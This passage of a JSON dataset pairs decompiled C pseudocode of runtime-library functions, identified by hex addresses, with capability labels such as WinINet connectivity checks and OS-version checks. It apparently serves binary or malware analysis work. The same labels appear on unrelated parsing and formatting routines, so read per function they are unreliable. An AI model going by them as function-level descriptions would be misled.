        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401794(int32_t *arg_8h, uint8_t **arg_ch, int32_t *arg_10h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint8_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    int32_t *piVar12;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint8_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_5h;\n    uint var_1h;\n    \n    cVar2 = fcn.00403cfb();\n    if (cVar2 == '\\0') {\n        return 7;\n    }\n    puVar7 = *arg_ch;\n    uVar9 = *puVar7;\n    puVar1 = puVar7;\n    while( true ) {\n        *arg_ch = puVar1 + 1;\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        iVar4 = fcn.00403cb0(uVar9, 8, arg_8h);\n        if (iVar4 == 0) break;\n        puVar1 = *arg_ch;\n        uVar9 = *puVar1;\n    }\n    piVar10 = arg_10h + 0xc2;\n    *piVar10 = var_5h == 0x2d;\n    if ((var_5h == 0x2d) || (var_5h == 0x2b)) {\n        var_5h._0_1_ = **arg_ch;\n        var_5h = var_5h & 0xffffff00 | var_5h;\n        *arg_ch = *arg_ch + 1;\n    }\n    if ((var_5h == 0x49) || (var_5h == 0x69)) {\n        uVar8 = fcn.004032dd(&var_5h, arg_ch, puVar7);\n        return uVar8;\n    }\n    if ((var_5h == 0x4e) || (var_5h == 0x6e)) {\n        uVar8 = fcn.004055a6(&var_5h, arg_ch, puVar7);\n        return uVar8;\n    }\n    var_ch = 0;\n    var_1h._0_1_ = 0;\n    var_14h = puVar7;\n    if (var_5h == 0x30) {\n        var_14h = *arg_ch;\n        uVar9 = *var_14h;\n        var_18h = var_18h & 0xffffff00 | uVar9;\n        *arg_ch = var_14h + 1;\n        if ((uVar9 == 0x78) || (uVar9 == 0x58)) {\n            var_5h._0_1_ = var_14h[1];\n            var_1h._0_1_ = 1;\n            var_5h = var_5h & 0xffffff00 | var_5h;\n            *arg_ch = var_14h + 2;\n        }\n        else {\n            fcn.00402dce(var_18h);\n            var_14h = puVar7;\n        }\n    }\n    uVar8 = var_5h;\n    piVar5 = arg_10h + 2;\n    if (var_5h == 0x30) {\n        uVar8 = 0x100;\n        do {\n            uVar9 = **arg_ch;\n            uVar8 = uVar8 & 0xffffff00 | uVar9;\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        } while (uVar9 == 0x30);\n    }\n    uVar11 = ((var_1h == 0) - 1 & 6) + 9;\n    piVar12 = piVar5;\n    while( true ) {\n        cVar2 = uVar8;\n        if (cVar2 - 0x30U < 10) {\n            uVar6 = cVar2 - 0x30;\n        }\n        else if (cVar2 + 0x9fU < 0x1a) {\n            uVar6 = cVar2 - 0x57;\n        }\n        else if (cVar2 + 0xbfU < 0x1a) {\n            uVar6 = cVar2 - 0x37;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n        if (uVar11 < uVar6) break;\n        if (piVar12 != piVar10) {\n            *piVar12 = uVar6;\n            piVar12 = piVar12 + 1;\n        }\n        var_ch = var_ch + 1;\n        uVar9 = **arg_ch;\n        uVar8 = CONCAT11(1, uVar9);\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        *arg_ch = *arg_ch + 1;\n    }\n    iVar4 = 0;\n    if (cVar2 == ***(*arg_8h + 0x88)) {\n        uVar9 = **arg_ch;\n        puVar7 = *arg_ch + 1;\n        uVar8 = uVar8 & 0xffffff00 | uVar9;\n        var_5h = var_5h & 0xffffff00 | uVar9;\n        *arg_ch = puVar7;\n        if ((piVar12 == piVar5) && (uVar9 == 0x30)) {\n            uVar8 = 0x100;\n            do {\n                uVar9 = *puVar7;\n                uVar8 = uVar8 & 0xffffff00 | uVar9;\n                var_ch = var_ch + -1;\n                puVar7 = puVar7 + 1;\n                var_5h = var_5h & 0xffffff00 | uVar9;\n                *arg_ch = puVar7;\n            } while (uVar9 == 0x30);\n        }\n        while( true ) {\n            cVar2 = uVar8;\n            if (cVar2 - 0x30U < 10) {\n                uVar6 = cVar2 - 0x30;\n            }\n            else if (cVar2 + 0x9fU < 0x1a) {\n                uVar6 = cVar2 - 0x57;\n            }\n            else if (cVar2 + 0xbfU < 0x1a) {\n                uVar6 = cVar2 - 0x37;\n            }\n            else {\n                uVar6 = 0xffffffff;\n            }\n            if (uVar11 < uVar6) break;\n            if (piVar12 != piVar10) {\n                *piVar12 = uVar6;\n                piVar12 = piVar12 + 1;\n            }\n            uVar9 = **arg_ch;\n            uVar8 = CONCAT11(1, uVar9);\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n    }\n    if (uVar8 >> 8 == '\\0') {\n        fcn.00402dce(var_5h);\n        *arg_ch = var_14h;\n        if (var_1h != 0) {\n            return 2;\n        }\n        return 7;\n    }\n    fcn.00402dce(var_5h);\n    puVar1 = *arg_ch;\n    uVar9 = *puVar1;\n    puVar7 = puVar1 + 1;\n    uVar8 = var_5h & 0xffffff00;\n    var_5h = uVar8 | uVar9;\n    *arg_ch = puVar7;\n    if (uVar9 == 0x45) {\ncode_r0x004b2b2e:\n        uVar3 = var_1h ^ 1;\n    }\n    else {\n        if (uVar9 != 0x50) {\n            if (uVar9 == 0x65) goto code_r0x004b2b2e;\n            uVar3 = 0;\n            if (uVar9 != 0x70) goto code_r0x004b2b33;\n        }\n        uVar3 = var_1h;\n    }\ncode_r0x004b2b33:\n    if (uVar3 != 0) {\n        uVar9 = *puVar7;\n        uVar11 = uVar9 << 8;\n        *arg_ch = puVar1 + 2;\n        if ((uVar9 == 0x2b) || (uVar11 = CONCAT11(uVar9, uVar9),  uVar9 == 0x2d)) {\n            uVar9 = puVar1[2];\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = puVar1 + 3;\n        }\n        var_5h = uVar8 | uVar9;\n        uVar8 = uVar9;\n        if (uVar11 == '0') {\n            uVar8 = 0x100;\n            do {\n                uVar9 = **arg_ch;\n                uVar8 = uVar8 & 0xffffff00 | uVar9;\n                var_5h = var_5h & 0xffffff00 | uVar9;\n                uVar11 = uVar11 & 0xffffff00 | uVar9;\n                *arg_ch = *arg_ch + 1;\n            } while (uVar9 == 0x30);\n        }\n        while( true ) {\n            cVar2 = uVar11;\n            if (cVar2 - 0x30U < 10) {\n                uVar6 = cVar2 - 0x30;\n            }\n            else if (cVar2 + 0x9fU < 0x1a) {\n                uVar6 = cVar2 - 0x57;\n            }\n            else if (cVar2 + 0xbfU < 0x1a) {\n                uVar6 = cVar2 - 0x37;\n            }\n            else {\n                uVar6 = 0xffffffff;\n            }\n            if (9 < uVar6) goto code_r0x004b2bd2;\n            uVar8 = CONCAT11(1, uVar8);\n            iVar4 = iVar4 * 10 + uVar6;\n            if (0x1450 < iVar4) break;\n            uVar9 = **arg_ch;\n            uVar8 = CONCAT11(1, uVar9);\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n        iVar4 = 0x1451;\ncode_r0x004b2bd2:\n        while( true ) {\n            cVar2 = uVar11;\n            if ((uVar8 < '0') || ('9' < cVar2)) {\n                if (cVar2 + 0x9fU < 0x1a) {\n                    uVar6 = cVar2 - 0x57;\n                }\n                else if (cVar2 + 0xbfU < 0x1a) {\n                    uVar6 = cVar2 - 0x37;\n                }\n                else {\n                    uVar6 = 0xffffffff;\n                }\n            }\n            else {\n                uVar6 = cVar2 - 0x30;\n            }\n            if (9 < uVar6) break;\n            uVar9 = **arg_ch;\n            uVar8 = uVar8 & 0xffffff00 | uVar9;\n            var_5h = var_5h & 0xffffff00 | uVar9;\n            uVar11 = uVar11 & 0xffffff00 | uVar9;\n            *arg_ch = *arg_ch + 1;\n        }\n        if (uVar11 >> 8 == '-') {\n            iVar4 = -iVar4;\n        }\n        if (uVar8 >> 8 == '\\0') {\n            fcn.00402dce(var_5h);\n            *arg_ch = puVar1;\n            var_5h = var_5h & 0xffffff00 | *puVar1;\n            *arg_ch = puVar7;\n        }\n    }\n    fcn.00402dce(var_5h);\n    if (piVar12 != piVar5) {\n        do {\n            if (*(piVar12 + -1) != '\\0') break;\n            piVar12 = piVar12 + -1;\n        } while (piVar12 != piVar5);\n        if (piVar12 != piVar5) {\n            if (0x1450 < iVar4) {\n                return 9;\n            }\n            if (-0x1451 < iVar4) {\n                iVar4 = iVar4 + (((var_1h == 0) - 1 & 3) + 1) * var_ch;\n                if (0x1450 < iVar4) {\n                    return 9;\n                }\n                if (-0x1451 < iVar4) {\n                    *arg_10h = iVar4;\n                    arg_10h[1] = piVar12 - piVar5;\n                    return var_1h;\n                }\n            }\n            return 8;\n        }\n    }\n    return 2;\n}\n",
        "token_count": 3090
    },
    "004017a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017a3(uint arg_8h)\n\n{\n    if (*0x56f249 == '\\0') {\n        *0x56f249 = '\\x01';\n        fcn.004039f9(fcn.00462de7);\n    }\n    *0x56f23c = arg_8h;\n    return;\n}\n",
        "token_count": 79
    },
    "004017b7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004017b7(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004017df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017df(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    in_ECX[1] = 0;\n    iVar1 = arg_8h;\n    if ((arg_8h != 2) && (arg_8h != 3)) {\n        iVar1 = 0;\n    }\n    *in_ECX = 0;\n    *(in_ECX + 1) = iVar1;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0040487c(1);\n        *in_ECX = iVar1;\n        if (iVar1 == 0) {\n            *(in_ECX + 1) = 3;\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00401834": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401834(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 247
    },
    "00401843": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401843(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.004053da(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.004053da(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 396
    },
    "00401852": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401852(uint *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 1) == '\\0') {\n        return *param_1;\n    }\n    fcn.004035f8(L\"!_is_double\", L\"__crt_strtox::floating_point_value::as_float\", \n                 L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x1a5, 0);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 148
    },
    "0040187a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040187a(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00401884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.00401884(uint *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint *in_stack_ffffffc4;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        if (*arg_ch != 0) {\n            var_18h = 0x54f814;\n            var_14h = 2;\n            fcn.00402e87(&var_28h, 0x28, arg_ch);\n            fcn.004050ba(&var_20h, &var_18h);\n            fcn.004061ef(&var_10h, 1);\n            puVar3 = &var_8h;\n            goto code_r0x0048b8dc;\n        }\n    }\n    else {\n        iVar1 = fcn.00403b61();\n        if ((-1 < iVar1) && (iVar1 != 0)) {\n            var_8h = 0;\n            var_4h = 0;\n            iVar4 = iVar1;\n            if ((arg_ch[1] & 0x800U) == 0) goto code_r0x0048b7fe;\n            in_stack_ffffffc4 = &var_10h;\n            var_10h = 0x54ed6c;\n            var_ch = 2;\n            fcn.00405c95(in_stack_ffffffc4);\n            while (iVar4 = iVar1,  var_4h < '\\x02') {\ncode_r0x0048b7fe:\n                iVar1 = iVar4 + -1;\n                if ((iVar4 == 0) || (**0x56f458 == '\\0')) break;\n                uVar2 = fcn.00403535(&var_10h, 0);\n                fcn.00402e87(&var_20h, 0x5b, uVar2);\n                in_stack_ffffffc4 = fcn.004032bf(&var_28h, 0x5d);\n                fcn.00402eb9(in_stack_ffffffc4);\n            }\n            if (*arg_ch != 0) {\n                if ((arg_ch[1] & 0x800U) == 0) {\n                    fcn.00402e87(&var_28h, 0x28, arg_ch);\n                    fcn.004032bf(&var_20h, 0x29);\n                }\n                puVar3 = fcn.004052f9(in_stack_ffffffc4, unaff_EBX);\n                var_8h = *puVar3;\n                var_4h = puVar3[1];\n            }\n            fcn.00403625(&var_18h, &var_8h);\n            *arg_8h = var_18h;\n            arg_8h[1] = var_14h | 0x800;\n            return arg_8h;\n        }\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040448a(0x5b);\n    fcn.004061ef(&var_28h, 1);\n    puVar3 = &var_20h;\ncode_r0x0048b8dc:\n    uVar2 = fcn.004032bf(puVar3, 0x5d);\n    fcn.00405b41(arg_8h, uVar2);\n    return arg_8h;\n}\n",
        "token_count": 851
    },
    "0040188e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040188e(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "0041ac80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint ****** __thiscall\nfcn.0041ac80(int32_t *param_1, uint ******param_2, uint32_t param_3, uint *****param_4, int32_t param_5, uint8_t param_6\n            , uint8_t param_7)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    uint ****ppppuVar3;\n    uint ***pppuVar4;\n    uint ***pppuVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    uint *******pppppppuVar8;\n    uint *****pppppuVar9;\n    int32_t iVar10;\n    uint ******ppppppuVar11;\n    uint32_t *puVar12;\n    int32_t iVar13;\n    int32_t **in_FS_OFFSET;\n    uint *******pppppppuStack136;\n    ulong uStack132;\n    int32_t iStack124;\n    int32_t iStack120;\n    uint32_t uStack116;\n    ulong uStack112;\n    uint *******pppppppuStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ulong uStack88;\n    uint *******pppppppuStack80;\n    int32_t *piStack76;\n    uint uStack72;\n    uint uStack68;\n    ulong uStack64;\n    uint *****pppppuStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint8_t uStack33;\n    uint *******pppppppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    pppppppuStack32 = &pppppppuStack136;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e440;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    if ((*(param_5 + 0x15) & 0x40) == 0) {\n        uStack116 = param_7;\n        uStack132 = CONCAT44(param_4, param_3);\n        iStack120 = param_6;\n        iStack124 = param_5;\n        pppppppuStack136 = param_2;\n        uStack112 = uStack132;\n        pppppppuStack32 = &pppppppuStack136;\n        (**(*param_1 + 0x24))();\n        *in_FS_OFFSET = piStack28;\n    }\n    else {\n        piStack76 = *(*(param_5 + 0x30) + 4);\n        (**(*piStack76 + 4))();\n        uStack20 = 0;\n        pppppppuStack136 = &pppppppuStack80;\n        piVar6 = fcn.0040632a();\n        if ((piStack76 != NULL) && (puVar7 = (**(*piStack76 + 8))(),  puVar7 != NULL)) {\n            pppppppuStack136 = 0x1;\n            (***puVar7)();\n        }\n        uStack64 = 0xf00000000;\n        pppppppuStack80 = NULL;\n        if (param_7 == 0) {\n            uStack20 = 2;\n            pppppppuStack136 = &pppppppuStack104;\n            (**(*piVar6 + 0x18))();\n        }\n        else {\n            uStack20 = 2;\n            pppppppuStack136 = &pppppppuStack104;\n            (**(*piVar6 + 0x1c))();\n        }\n        uStack64 = uStack88;\n        pppppppuStack80 = pppppppuStack104;\n        piStack76 = uStack100;\n        uStack72 = uStack96;\n        uStack68 = uStack92;\n        uVar2 = *(param_5 + 0x20);\n        uStack64._0_4_ = uStack88;\n        uStack40 = uStack64;\n        iStack44 = uVar2 - uStack64;\n        if (uVar2 < uStack64) {\n            iStack44 = 0;\n        }\n        if ((SBORROW4(*(param_5 + 0x24), uVar2 == 0) != false) != *(param_5 + 0x24) - (uVar2 == 0) < 0) {\n            iStack44 = 0;\n        }\n        pppppuStack56 = param_4;\n        if ((*(param_5 + 0x14) & 0x1c0) != 0x40) {\n            uStack52 = uStack52 & 0xffffff00 | param_3 & 0xff;\n            if (iStack44 != 0) {\n                uStack40 = param_6;\n                uStack48 = param_3;\n                do {\n                    if (param_4 == NULL) {\ncode_r0x0041ae10:\n                        uStack52 = CONCAT31(uStack52._1_3_, 1);\n                    }\n                    else {\n                        ppppuVar3 = param_4[8];\n                        pppuVar4 = *ppppuVar3;\n                        if (pppuVar4 == NULL) {\ncode_r0x0041ae50:\n                            uStack20 = 2;\n                            iVar13 = (*(*param_4)[3])(uStack40);\n                            param_3 = uStack48;\n                            param_4 = pppppuStack56;\n                            if (iVar13 == -1) goto code_r0x0041ae10;\n                        }\n                        else {\n                            pppuVar5 = *param_4[0xc];\n                            if (pppuVar5 < 1) goto code_r0x0041ae50;\n                            *param_4[0xc] = pppuVar5 + -1;\n                            *ppppuVar3 = pppuVar4 + 1;\n                            *pppuVar4 = param_6;\n                            param_3 = uStack48;\n                        }\n                    }\n                    iStack44 = iStack44 + -1;\n                } while (iStack44 != 0);\n            }\n            param_3 = param_3 & 0xffffff00 | uStack52 & 0xff;\n            iStack44 = 0;\n        }\n        uStack48 = param_3;\n        uStack33 = param_3;\n        if (uStack64 != NULL) {\n            pppppppuVar8 = &pppppppuStack80;\n            if (0xf < uStack64._4_4_) {\n                pppppppuVar8 = pppppppuStack80;\n            }\n            do {\n                if (param_4 == NULL) {\ncode_r0x0041aec0:\n                    uStack33 = 1;\n                }\n                else {\n                    uStack40 = uStack64;\n                    uStack52 = pppppppuVar8;\n                    uVar1 = *pppppppuVar8;\n                    ppppuVar3 = param_4[8];\n                    pppuVar4 = *ppppuVar3;\n                    if (pppuVar4 == NULL) {\ncode_r0x0041af10:\n                        uStack20 = 2;\n                        iVar13 = (*(*param_4)[3])(uVar1);\n                        pppppppuVar8 = uStack52;\n                        uStack64._0_4_ = uStack40;\n                        param_4 = pppppuStack56;\n                        if (iVar13 == -1) goto code_r0x0041aec0;\n                    }\n                    else {\n                        pppuVar5 = *param_4[0xc];\n                        if (pppuVar5 < 1) goto code_r0x0041af10;\n                        *param_4[0xc] = pppuVar5 + -1;\n                        *ppppuVar3 = pppuVar4 + 1;\n                        *pppuVar4 = uVar1;\n                        pppppppuVar8 = uStack52;\n                        uStack64._0_4_ = uStack40;\n                    }\n                }\n                pppppppuVar8 = pppppppuVar8 + 1;\n                uStack64._0_4_ = uStack64 - 1;\n            } while (uStack64 != NULL);\n        }\n        uStack48 = uStack48 & 0xffffff00;\n        pppppuVar9 = uStack33 | uStack48;\n        *(param_5 + 0x24) = 0;\n        *(param_5 + 0x20) = 0;\n        if (iStack44 != 0) {\n            uStack40 = param_6;\n            iVar13 = iStack44;\n            do {\n                if (param_4 == NULL) {\ncode_r0x0041af80:\n                    uStack33 = 1;\n                }\n                else {\n                    ppppuVar3 = param_4[8];\n                    pppuVar4 = *ppppuVar3;\n                    iStack44 = iVar13;\n                    if (pppuVar4 == NULL) {\ncode_r0x0041afc0:\n                        uStack20 = 2;\n                        iVar10 = (*(*param_4)[3])(uStack40);\n                        iVar13 = iStack44;\n                        param_4 = pppppuStack56;\n                        if (iVar10 == -1) goto code_r0x0041af80;\n                    }\n                    else {\n                        pppuVar5 = *param_4[0xc];\n                        if (pppuVar5 < 1) goto code_r0x0041afc0;\n                        *param_4[0xc] = pppuVar5 + -1;\n                        *ppppuVar3 = pppuVar4 + 1;\n                        *pppuVar4 = param_6;\n                    }\n                }\n                iVar13 = iVar13 + -1;\n            } while (iVar13 != 0);\n            pppppuVar9 = uStack48 | uStack33;\n        }\n        *param_2 = pppppuVar9;\n        param_2[1] = param_4;\n        if (0xf < uStack64._4_4_) {\n            ppppppuVar11 = uStack64._4_4_ + 1;\n            pppppppuVar8 = pppppppuStack80;\n            if (0xfff < ppppppuVar11) {\n                pppppppuVar8 = pppppppuStack80[-1];\n                if (0x1f < pppppppuStack80 + (-4 - pppppppuVar8)) {\n                    uStack20 = 1;\n                    puVar12 = fcn.004047f5();\n                    if ((uStack64 != NULL) && (puVar12 = (**(*uStack64 + 8))(),  puVar12 != NULL)) {\n                        puVar12 = (***puVar12)(1);\n                    }\n                    return puVar12;\n                }\n                ppppppuVar11 = uStack64._4_4_ + 0x24;\n            }\n            pppppppuStack136 = ppppppuVar11;\n            fcn.00401a32(pppppppuVar8);\n        }\n        *in_FS_OFFSET = piStack28;\n    }\n    return param_2;\n}\n",
        "token_count": 2530
    },
    "00401924": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00401924(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    float10 fVar3;\n    float fStack8;\n    \n    puVar2 = fcn.004039a4();\n    uVar1 = *puVar2;\n    *puVar2 = 0;\n    fVar3 = fcn.00406357(arg_8h, arg_ch);\n    *arg_14h = *puVar2;\n    *puVar2 = uVar1;\n    fStack8 = fVar3;\n    if (arg_10h != 0) {\n        fVar3 = fcn.00402c57(arg_10h);\n        fStack8 = fVar3 * fStack8;\n    }\n    return fStack8;\n}\n",
        "token_count": 197
    },
    "004194a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
